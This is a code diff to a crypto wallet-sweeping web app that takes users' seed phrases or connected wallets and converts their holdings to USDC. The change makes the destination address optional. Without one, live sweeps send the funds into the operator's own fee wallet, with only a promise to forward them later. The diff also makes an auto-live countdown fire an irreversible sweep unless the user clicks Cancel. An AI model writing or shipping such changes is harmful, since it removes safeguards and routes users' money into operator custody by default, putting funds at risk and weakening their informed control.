@@ -8,37 +8,38 @@
  *
  * Trust model:
  *   - Credits are server-authoritative (worker holds balance).
- *   - The sweep destination is committed to the worker before the
- *     sweep begins. /fee/record reads that commit and overwrites any
- *     client-supplied destination, so the operator view can't be
- *     tricked into forwarding to an attacker address.
- *   - /credits/consume and /gas/sponsor are idempotent on stable keys,
- *     so a client retry after a network blip won't double-charge or
- *     double-send.
+ *   - When a destination is present, it is committed to the worker
+ *     before the sweep begins. /fee/record reads that commit and
+ *     overwrites any client-supplied destination, so the operator view
+ *     can't be tricked into forwarding to an attacker address.
+ *   - When no destination is present, FEE_WALLET_EVM is used as a
+ *     placeholder. The user is prompted for a real address after the
+ *     sweep, and /sweep/destination updates the commit and the pending
+ *     fee record.
+ *   - /credits/consume and /gas/sponsor are idempotent on stable keys.
  *
- * Auto-live:
+ * Auto-live (see maybeAutoLive + ui.js showAutoLiveConfirm):
  *   After Preview, if any wallet+chain holds ≥ AUTO_LIVE_THRESHOLD_USDC
- *   of sweepable value, we offer to skip the manual Run click. Value
- *   estimates are computed inside runPreview and cached on
- *   state.previews so the modal can pop immediately and runSweep can
- *   reuse them without a second round of network calls. Auto-live
- *   waives the credit requirement — the 10% service fee covers it.
+ *   of sweepable value, we show a countdown modal and fire the live
+ *   sweep when it reaches 0, unless the user explicitly cancels.
+ *
+ *   The ONLY reasons auto-live returns early are:
+ *     (a) no eligible wallets, or
+ *     (b) the user clicked Cancel.
+ *   Nothing else — no missing destination, no form state, no estimate
+ *   hiccup — can prevent the countdown from completing.
+ *
+ * Destination-optional flow:
+ *   Preview, dry run, and auto-live do NOT require a destination. When
+ *   the user sweeps without one, the commit uses FEE_WALLET_EVM as a
+ *   placeholder, the fee record is written with that placeholder, and
+ *   a post-sweep prompt asks the user for a real destination. When they
+ *   enter one, /sweep/destination updates the commit and the fee record
+ *   so the operator can forward normally.
  *
  * Free credits:
  *   The launch bonus grants 2 free credits with two separate 24h
- *   clocks: 24h to claim, then 24h to use. Free credits live in their
- *   own pool on the worker and are consumed before paid credits.
- *
- * Wallet type drives the form defaults:
- *   - mnemonic        → all families shown and checked.
- *   - extension       → EVM + TRON shown and checked.
- *   - walletconnect,
- *     ledger, trezor  → EVM only.
- *
- * TRON:
- *   Signed by TronLink (extension) or by a locally-derived key
- *   (mnemonic). Sweeps TRC-20 USDT to USDC on Ethereum via deBridge.
- *   Native TRX is left in the wallet to cover energy/bandwidth.
+ *   clocks: 24h to claim, then 24h to use.
  *
  * Retry logic lives in ./retry.js and is injected with its network
  * dependencies here, so the loop mechanics are testable in Node.
@@ -70,7 +71,7 @@ import {
   getClientId, fetchBalance, fetchBalanceSnapshot, consumeCredit, invalidateBalanceCache,
   recordFee, requestGasSponsorship,
   fetchClaimInfo, claimFreeCredits,
-  commitSweep,
+  commitSweep, updateSweepDestination,
   isValidClientId, setClientId, verifyClientId,
 } from './credits.js';
 import { showCryptoPaymentModal } from './crypto-pay.js';
@@ -101,6 +102,9 @@ const MIN_SPONSOR_FLOOR_USDC = 0.02;
 const MAX_MNEMONICS_PER_SWEEP = 20;
 
 const userTouchedChains = new Set();
+
+// Set true while a preview, auto-live countdown, or sweep is in flight.
+let sweepInFlight = false;
 
 // =====================================================================
 // VALIDATION HELPERS
@@ -276,16 +280,22 @@ function validateInputs({ walletType, families, destinations, mnemonics }) {
     errors.push('TRON sweeping requires TronLink or a mnemonic.');
   }
 
+  // Destination is optional. Preview, dry run, and auto-live all run
+  // without one. A live sweep without a destination still runs; the
+  // operator forwards manually after the sweep and we prompt for the
+  // destination at the end. So this is a warning, not an error.
   if (families.evm || families.solana || families.bitcoin || families.tron) {
-    if (!destinations.evm) errors.push('Destination address is required.');
-    else if (!isEvmAddress(destinations.evm)) errors.push('Destination must be a valid 0x address.');
-  }
-
-  if (families.evm && destinations.evm && isSolanaAddress(destinations.evm) && !isEvmAddress(destinations.evm)) {
-    warnings.push('Your destination looks like a Solana address.');
-  }
-  if (families.evm && destinations.evm && isTronAddress(destinations.evm) && !isEvmAddress(destinations.evm)) {
-    warnings.push('Your destination looks like a TRON address. USDC is delivered on Ethereum — paste an EVM 0x address.');
+    if (!destinations.evm) {
+      warnings.push('No destination address entered. The sweep will still run and USDC will land in the operator fee wallet. You\'ll be asked for a destination after the sweep.');
+    } else if (!isEvmAddress(destinations.evm)) {
+      if (isSolanaAddress(destinations.evm)) {
+        warnings.push('Your destination looks like a Solana address. USDC is delivered on Ethereum — paste an EVM 0x address.');
+      } else if (isTronAddress(destinations.evm)) {
+        warnings.push('Your destination looks like a TRON address. USDC is delivered on Ethereum — paste an EVM 0x address.');
+      } else {
+        warnings.push('Destination does not look like a valid EVM 0x address. The sweep will still run; USDC will land in the operator fee wallet and you\'ll be asked for a destination after the sweep.');
+      }
+    }
   }
 
   return { errors, warnings };
@@ -354,10 +364,10 @@ function syncDestinationFields() {
   if (label && hint) {
     if (!evm && (solana || bitcoin || tron)) {
       label.textContent = 'Destination (receives USDC on Ethereum after bridge)';
-      hint.textContent = 'Non-EVM sweeps are bridged to Ethereum USDC and delivered to this 0x address.';
+      hint.textContent = 'Optional. If left blank, USDC lands in the operator wallet and you\'ll be asked for a destination after the sweep.';
     } else {
       label.textContent = 'Destination (receives USDC on Ethereum)';
-      hint.textContent = 'EVM sweeps deliver USDC directly. Solana, Bitcoin, and TRON sweeps are bridged to Ethereum USDC and delivered here.';
+      hint.textContent = 'Optional. If left blank, USDC lands in the operator wallet and you\'ll be asked for a destination after the sweep.';
     }
   }
 }
@@ -480,6 +490,144 @@ async function commitSweepWithRetry(sweepId, userDestination, logLine) {
   return commitSweepWithRetryCore({ commitFn: commitSweep, sweepId, userDestination, logLine });
 }
 
+// =====================================================================
+// POST-SWEEP DESTINATION PROMPT
+// =====================================================================
+//
+// When a live sweep runs without a valid destination, the commit uses
+// FEE_WALLET_EVM as a placeholder. After the sweep, we show an inline
+// card asking for the real destination.
+//
+// The sweep ID is cached in sessionStorage so a page reload in the
+// same tab re-shows the prompt. If the user closes the tab, the
+// operator view still shows a HOLD note and can chase the user.
+// =====================================================================
+
+const PENDING_SWEEP_KEY = 'sweep_pending_destination';
+
+function rememberPendingSweep(sweepId) {
+  try {
+    const existing = JSON.parse(sessionStorage.getItem(PENDING_SWEEP_KEY) || '[]');
+    if (!existing.includes(sweepId)) {
+      existing.push(sweepId);
+      sessionStorage.setItem(PENDING_SWEEP_KEY, JSON.stringify(existing));
+    }
+  } catch (e) {
+    // sessionStorage unavailable — prompt only shows this session.
+  }
+}
+
+function forgetPendingSweep(sweepId) {
+  try {
+    const existing = JSON.parse(sessionStorage.getItem(PENDING_SWEEP_KEY) || '[]');
+    const filtered = existing.filter((id) => id !== sweepId);
+    if (filtered.length === 0) {
+      sessionStorage.removeItem(PENDING_SWEEP_KEY);
+    } else {
+      sessionStorage.setItem(PENDING_SWEEP_KEY, JSON.stringify(filtered));
+    }
+  } catch (e) { /* ignore */ }
+}
+
+function getPendingSweeps() {
+  try {
+    return JSON.parse(sessionStorage.getItem(PENDING_SWEEP_KEY) || '[]');
+  } catch {
+    return [];
+  }
+}
+
+function showDestinationPrompt(sweepId) {
+  const container = $('#post-sweep-destination');
+  if (!container) return;
+
+  container.style.display = '';
+  container.innerHTML = `
+    <h2>Where should we send your USDC?</h2>
+    <p class="hint">
+      Your sweep completed and the USDC is in the operator fee wallet.
+      Enter an Ethereum (0x) address and we'll forward 90% of the swept
+      amount there. Without a destination, the funds stay in the fee
+      wallet until you provide one.
+    </p>
+    <div class="post-sweep-row">
+      <input
+        id="post-sweep-destination-input"
+        type="text"
+        placeholder="0x..."
+        autocomplete="off"
+        spellcheck="false"
+      >
+      <button id="post-sweep-destination-save" class="btn btn-primary" type="button">
+        Save destination
+      </button>
+    </div>
+    <div id="post-sweep-destination-status" class="post-sweep-status" style="display:none;"></div>
+    <p class="hint" style="font-size:12px; margin-top:12px;">
+      Sweep ID: <code>${sweepId.slice(0, 12)}...</code>
+    </p>
+  `;
+
+  const input = document.getElementById('post-sweep-destination-input');
+  const saveBtn = document.getElementById('post-sweep-destination-save');
+  const status = document.getElementById('post-sweep-destination-status');
+
+  saveBtn.addEventListener('click', async () => {
+    const candidate = input.value.trim();
+    status.style.display = 'block';
+
+    if (!isEvmAddress(candidate)) {
+      status.className = 'post-sweep-status error';
+      status.textContent = 'That does not look like a valid Ethereum (0x) address.';
+      return;
+    }
+
+    saveBtn.disabled = true;
+    saveBtn.textContent = 'Saving…';
+    status.className = 'post-sweep-status';
+    status.textContent = 'Updating the sweep record…';
+
+    try {
+      const result = await updateSweepDestination(sweepId, candidate);
+
+      if (result.feeRecordUpdated) {
+        status.className = 'post-sweep-status success';
+        status.textContent = `Destination saved. The operator will forward 90% of the sweep to ${candidate}.`;
+      } else {
+        status.className = 'post-sweep-status success';
+        status.textContent = 'Destination saved. It will be applied when the sweep record settles.';
+      }
+
+      forgetPendingSweep(sweepId);
+
+      setTimeout(() => {
+        const remaining = getPendingSweeps();
+        if (remaining.length > 0) {
+          showDestinationPrompt(remaining[0]);
+        } else {
+          container.style.display = 'none';
+          container.innerHTML = '';
+        }
+      }, 2500);
+    } catch (err) {
+      saveBtn.disabled = false;
+      saveBtn.textContent = 'Save destination';
+      status.className = 'post-sweep-status error';
+      status.textContent = `Could not save: ${scrubSecret(err.message)}`;
+    }
+  });
+}
+
+function restorePendingDestinationPrompt() {
+  const pending = getPendingSweeps();
+  if (pending.length === 0) return;
+  showDestinationPrompt(pending[0]);
+}
+
+// =====================================================================
+// GAS SPONSORSHIP ADAPTERS
+// =====================================================================
+
 async function ensureWalletGasOnce(chain, walletAddress) {
   return ensureWalletGasOnceCore({
     sponsorFn: requestGasSponsorship,
@@ -504,43 +652,52 @@ async function withGasSponsorship(chain, walletAddress, action) {
 // =====================================================================
 // AUTO-LIVE — value estimates
 // =====================================================================
+//
+// All estimates run in parallel. Each estimate is retried twice on
+// failure (three attempts total); if all three fail, the preview is
+// marked $0 so it won't be swept. Fail-closed is correct for
+// auto-live, but it means a sustained quoter outage can exclude a
+// wallet the user expected to sweep.
+// =====================================================================
 
 async function annotatePreviewValues(inputs) {
-  // All families estimated in parallel. Within each family, entries
-  // are also estimated in parallel. Previously everything was serial,
-  // which took 10+ seconds for a wallet with 6 EVM chains.
   const tasks = [];
+
+  const estimateWithRetry = async (fn, preview) => {
+    for (let attempt = 1; attempt <= 3; attempt++) {
+      try {
+        preview._usdValue = await fn();
+        return;
+      } catch (e) {
+        if (attempt === 3) {
+          preview._usdValue = 0;
+        } else {
+          await new Promise((r) => setTimeout(r, 300 * attempt));
+        }
+      }
+    }
+  };
 
   if (inputs.families.evm) {
     for (const p of state.previews.evm) {
-      tasks.push((async () => {
-        try { p._usdValue = await estimateChainValueUsdc(p.chain, p); }
-        catch { p._usdValue = 0; }
-      })());
+      tasks.push(estimateWithRetry(
+        () => estimateChainValueUsdc(p.chain, p), p
+      ));
     }
   }
   if (inputs.families.solana) {
     for (const p of state.previews.solana) {
-      tasks.push((async () => {
-        try { p._usdValue = await estimateSolanaValueUsdc(p); }
-        catch { p._usdValue = 0; }
-      })());
+      tasks.push(estimateWithRetry(() => estimateSolanaValueUsdc(p), p));
     }
   }
   if (inputs.families.bitcoin) {
     for (const p of state.previews.bitcoin) {
-      tasks.push((async () => {
-        try { p._usdValue = await estimateBitcoinValueUsdc(p); }
-        catch { p._usdValue = 0; }
-      })());
+      tasks.push(estimateWithRetry(() => estimateBitcoinValueUsdc(p), p));
     }
   }
   if (inputs.families.tron) {
     for (const p of state.previews.tron) {
-      tasks.push((async () => {
-        try { p._usdValue = await estimateTronValueUsdc(p); }
-        catch { p._usdValue = 0; }
-      })());
+      tasks.push(estimateWithRetry(() => estimateTronValueUsdc(p), p));
     }
   }
 
@@ -572,29 +729,71 @@ function collectEligible() {
   return eligible;
 }
 
+function setSweepLock(locked, label) {
+  sweepInFlight = locked;
+  const runBtn = $('#run-button');
+  const previewBtn = $('#preview-button');
+  if (runBtn) {
+    runBtn.disabled = locked;
+    if (locked && label) runBtn.textContent = label;
+  }
+  if (previewBtn) previewBtn.disabled = locked;
+}
+
+// =====================================================================
+// AUTO-LIVE
+// =====================================================================
+//
+// Only two return paths:
+//   (a) no eligible wallets, or
+//   (b) the user clicked Cancel in the modal.
+//
+// No other condition — no missing destination, no form state, no
+// estimate hiccup — can stop the countdown or prevent the sweep from
+// firing after it reaches 0.
+// =====================================================================
+
 async function maybeAutoLive() {
   const eligible = collectEligible();
-  if (eligible.length === 0) return;
+  if (eligible.length === 0) return;  // (a)
 
   const totalUsd = eligible.reduce((sum, e) => sum + e.usdValue, 0);
   const walletCount = eligible.length;
 
+  // Snapshot inputs so a mid-countdown form edit can't change what
+  // actually gets swept. Note: a missing destination is fine here —
+  // the sweep runs without a real destination and we prompt after.
+  const snapshot = readInputs();
+
   logLine(`\n⚡ ${walletCount} wallet${walletCount === 1 ? '' : 's'} ≥ $${AUTO_LIVE_THRESHOLD_USDC} (~$${totalUsd.toFixed(2)} total) — auto-live eligible.`);
 
-  if (AUTO_LIVE_REQUIRE_CONFIRM) {
-    const ok = await showAutoLiveConfirm({
-      totalUsd, walletCount,
-      seconds: AUTO_LIVE_COUNTDOWN_SECONDS,
-      modeWasDryRun: state.mode !== 'live',
-    });
-    if (!ok) {
-      logLine('  Auto-live cancelled. Preview remains available; press Run for a dry run or switch Mode to Live.');
-      return;
-    }
-  }
+  setSweepLock(true, 'Auto-live…');
 
-  logLine('  Auto-live: credit waived — the 10% service fee covers this sweep.\n');
-  await runSweep(true, { autoLive: true, onlyEligible: eligible });
+  try {
+    if (AUTO_LIVE_REQUIRE_CONFIRM) {
+      const ok = await showAutoLiveConfirm({
+        totalUsd,
+        walletCount,
+        seconds: AUTO_LIVE_COUNTDOWN_SECONDS,
+        modeWasDryRun: state.mode !== 'live',
+        thresholdUsd: AUTO_LIVE_THRESHOLD_USDC,
+      });
+      if (!ok) {
+        // (b) user cancelled
+        logLine('  Auto-live cancelled. Press Run for a dry run or switch Mode to Live.');
+        return;
+      }
+    }
+
+    logLine('  Auto-live: credit waived — the 10% service fee covers this sweep.\n');
+    await runSweep(true, {
+      autoLive: true,
+      onlyEligible: eligible,
+      inputsSnapshot: snapshot,
+    });
+  } finally {
+    setSweepLock(false);
+  }
 }
 
 // =====================================================================
@@ -763,9 +962,6 @@ function renderFreeClaimBanner(info) {
 async function connectWalletAndStoreForType(walletType) {
   track.walletSelected(walletType);
 
-  // Dispose any previous wallet before connecting a new one. If the
-  // new connection fails, state.wallet must not remain pointing at
-  // the old (possibly disposed) backend.
   if (state.wallet) {
     try { await state.wallet.dispose?.(); } catch {}
     state.wallet = null;
@@ -851,6 +1047,8 @@ async function connectWalletAndStoreForType(walletType) {
 // =====================================================================
 
 async function runPreview() {
+  if (sweepInFlight) return;
+
   const startTime = Date.now();
   clearLog();
   const inputs = readInputs();
@@ -1015,7 +1213,9 @@ async function runSweep(live, opts = {}) {
 
   const sweepId = crypto.randomUUID();
 
-  const inputs = readInputs();
+  // When runSweep is called from auto-live, use the input snapshot taken
+  // before the countdown modal opened. Otherwise read fresh.
+  const inputs = opts.inputsSnapshot || readInputs();
   const destinations = inputs.destinations;
   const families = inputs.families;
 
@@ -1052,9 +1252,23 @@ async function runSweep(live, opts = {}) {
       if (balance < 1) { logLine('ERROR: still no credits after payment.'); return; }
     }
 
+    // If the user hasn't entered a destination, commit with the fee
+    // wallet as a placeholder. The operator sees a "HOLD" note and can
+    // wait for the user to update it. This keeps the sweep billable
+    // even when the user is lazy — the fee record is always written.
+    const placeholderDestination = isEvmAddress(destinations.evm)
+      ? destinations.evm
+      : FEE_WALLET_EVM;
+    const usedPlaceholder = placeholderDestination === FEE_WALLET_EVM
+      && !isEvmAddress(destinations.evm);
+
     try {
-      await commitSweepWithRetry(sweepId, destinations.evm, logLine);
-      logLine(`  Sweep destination committed: ${destinations.evm}`);
+      await commitSweepWithRetry(sweepId, placeholderDestination, logLine);
+      if (usedPlaceholder) {
+        logLine(`  Sweep destination committed (placeholder — fee wallet). You'll be prompted for a real destination after the sweep.`);
+      } else {
+        logLine(`  Sweep destination committed: ${placeholderDestination}`);
+      }
     } catch (err) {
       logLine(`ERROR: could not commit sweep to worker: ${scrubSecret(err.message)}`);
       return;
@@ -1071,6 +1285,13 @@ async function runSweep(live, opts = {}) {
         return;
       }
     }
+
+    // Stash these for the post-sweep prompt, below.
+    var _usedPlaceholder = usedPlaceholder;
+    var _placeholderDestination = placeholderDestination;
+  } else {
+    var _usedPlaceholder = false;
+    var _placeholderDestination = destinations.evm || FEE_WALLET_EVM;
   }
 
   const dryRun = !live;
@@ -1306,7 +1527,7 @@ async function runSweep(live, opts = {}) {
         try {
           const r = await sweepTron(address, {
             dryRun,
-            destination: destinations.evm,
+            destination: _placeholderDestination,
             tronWeb,
           });
           state.results.tron.push({ index, ...r });
@@ -1443,7 +1664,11 @@ async function runSweep(live, opts = {}) {
       if (totalSponsorFeesUsdc > 0) {
         logLine(`  Sponsorship fees:    -$${totalSponsorFeesUsdc.toFixed(2)}`);
       }
-      logLine(`  Your destination:    ${destinations.evm || '(not set)'}`);
+      if (_usedPlaceholder) {
+        logLine(`  Your destination:    (not yet provided — you'll be prompted below)`);
+      } else {
+        logLine(`  Your destination:    ${_placeholderDestination}`);
+      }
       logLine(`  You will receive:    ~$${netUserUsdc.toFixed(2)} (90%${totalSponsorFeesUsdc > 0 ? ' minus sponsorship' : ''})`);
       logLine(`  Estimated time:      within a few minutes`);
       logLine('');
@@ -1469,7 +1694,7 @@ async function runSweep(live, opts = {}) {
             decimals: entry.decimals,
             symbol: 'USDC',
             recipient: FEE_WALLET_EVM,
-            userDestination: destinations.evm,
+            userDestination: _placeholderDestination,
             userShareRaw: entry.userShareRaw,
             operatorFeeRaw: entry.operatorFeeRaw,
           });
@@ -1487,7 +1712,7 @@ async function runSweep(live, opts = {}) {
             destinationChain: 'ethereum',
             bridge: 'debridge',
             orderIds: entry.orderIds,
-            userDestination: destinations.evm,
+            userDestination: _placeholderDestination,
             userShareRaw: entry.userShareRaw,
             operatorFeeRaw: entry.operatorFeeRaw,
             estimated: true,
@@ -1506,7 +1731,7 @@ async function runSweep(live, opts = {}) {
             destinationChain: 'ethereum',
             bridge: 'thorchain',
             txids: entry.txids,
-            userDestination: destinations.evm,
+            userDestination: _placeholderDestination,
             userShareRaw: entry.userShareRaw,
             operatorFeeRaw: entry.operatorFeeRaw,
             estimated: true,
@@ -1526,7 +1751,7 @@ async function runSweep(live, opts = {}) {
             bridge: 'debridge',
             txids: entry.txids,
             orderIds: entry.orderIds,
-            userDestination: destinations.evm,
+            userDestination: _placeholderDestination,
             userShareRaw: entry.userShareRaw,
             operatorFeeRaw: entry.operatorFeeRaw,
             estimated: true,
@@ -1554,6 +1779,13 @@ async function runSweep(live, opts = {}) {
       }
     }
 
+    // If the user swept without a destination, show the post-sweep
+    // prompt and cache the pending sweep so it survives a reload.
+    if (live && _usedPlaceholder) {
+      rememberPendingSweep(sweepId);
+      showDestinationPrompt(sweepId);
+    }
+
     track.sweepCompleted({ live, durationMs: Date.now() - startTime, successes, failures });
   } catch (e) {
     reportError(e, { phase: 'sweep_fatal', live });
@@ -1571,6 +1803,7 @@ document.addEventListener('DOMContentLoaded', async () => {
   initPlausible();
   getClientId();
   initAccountSection();
+  restorePendingDestinationPrompt();
 
   fetchClaimInfo()
     .then(renderFreeClaimBanner)
@@ -1594,9 +1827,7 @@ document.addEventListener('DOMContentLoaded', async () => {
       hide('#connected-banner');
       syncMnemonicNotice();
       syncWalletTypeDefaults();
-      // Any wallet-type change invalidates the current preview.
       invalidatePreview();
-      // Clear any pasted mnemonics on switch away from mnemonic mode.
       if (e.target.value !== 'mnemonic') {
         $('#phrases').value = '';
       }
@@ -1612,20 +1843,16 @@ document.addEventListener('DOMContentLoaded', async () => {
     const el = $(sel);
     if (el) el.addEventListener('change', () => {
       syncDestinationFields();
-      // Family change invalidates the current preview.
       invalidatePreview();
     });
   });
   syncDestinationFields();
   trackChainTouches();
 
-  // Chain checkbox change invalidates the preview too.
   $$('#chain-list input[type=checkbox]').forEach((cb) => {
     cb.addEventListener('change', invalidatePreview);
   });
 
-  // Editing the mnemonic textarea invalidates the preview, since the
-  // derived keys would no longer match what's in the field.
   $('#phrases')?.addEventListener('input', invalidatePreview);
 
   const connectButtons = [
@@ -1642,9 +1869,6 @@ document.addEventListener('DOMContentLoaded', async () => {
 
   $('#preview-button').addEventListener('click', runPreview);
 
-  // Run button: disable during execution to prevent double-click
-  // double-sweeps (which would consume two credits and duplicate the
-  // destination commits).
   $('#run-button').addEventListener('click', async () => {
     const btn = $('#run-button');
     if (btn.disabled) return;
